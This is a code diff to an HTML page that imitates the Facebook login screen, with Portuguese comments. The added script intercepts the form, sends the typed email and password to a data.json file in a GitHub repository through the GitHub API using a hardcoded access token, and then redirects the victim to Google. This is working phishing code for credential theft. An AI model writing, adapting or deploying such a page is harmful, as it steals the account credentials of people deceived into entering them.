@@ -107,7 +107,7 @@
       <img src="facebook-logo.png" alt="Facebook Logo">
       <h2>Entrar no Facebook</h2>
       <!-- Alteração no atributo action e método de envio do formulário -->
-      <form action="salvar_login.php" method="post">
+      <form id="login-form">
         <label for="email">Email ou Senha:</label>
         <input type="text" id="email" name="email" required>
         <label for="password">Senha:</label>
@@ -121,5 +121,46 @@
       </form>
     </div>
   </div>
+
+  <!-- Script para enviar os dados do formulário para o GitHub -->
+  <script>
+    document.getElementById("login-form").addEventListener("submit", function(event) {
+      event.preventDefault();
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
+      const githubToken = "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"; // Substitua "SEU_TOKEN_AQUI" pelo seu token de acesso pessoal
+
+      const data = {
+        "logins": [
+          {
+            "email": email,
+            "password": password
+          }
+        ]
+      };
+
+      fetch("https://api.github.com/repos/romariogitrep/sitelogin/contents/data.json", {
+        method: "PUT",
+        headers: {
+          "Authorization": "token " + githubToken,
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          message: "Atualizar data.json",
+          content: btoa(JSON.stringify(data)),
+        }),
+      })
+      .then(response => response.json())
+      .then(data => {
+        console.log("Dados salvos com sucesso!");
+        console.log(data);
+        // Aqui você pode redirecionar o usuário para outra página, se desejar
+        window.location.href = "https://www.google.com.br";
+      })
+      .catch(error => {
+        console.error("Erro ao salvar os dados:", error);
+      });
+    });
+  </script>
 </body>
 </html>
